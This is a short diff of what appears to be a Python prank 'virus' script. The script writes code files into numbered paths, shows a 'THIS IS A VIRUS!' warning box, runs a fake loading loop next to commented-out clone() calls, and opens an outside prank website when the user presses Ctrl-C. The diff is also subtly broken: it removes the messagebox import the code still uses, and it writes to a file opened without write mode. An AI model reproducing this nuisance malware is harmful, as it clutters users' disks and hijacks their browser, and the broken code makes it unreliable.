@@ -116,9 +116,7 @@ try:
             with open(f"{new_dir}\{number}.py") as new_file:
                 new_file.write(r""" 
                 
-import snort
-import re
-from tkinter import messagebox
+
 try:
         
         ques = (messagebox.askyesno(title="WARNING", message="THIS IS A VIRUS! \nDO YOU WANT TO CONTINUE?"))
@@ -228,6 +226,8 @@ except Exception as error:
                   print(f"Loading... Object #{i}/10000 |")
                   #clone()
                   #clone()
+except KeyboardInterrupt:
+    webbrowser.open("https://piv.pivpiv.dk/")
 except Exception as error:
     print(error)
     pass
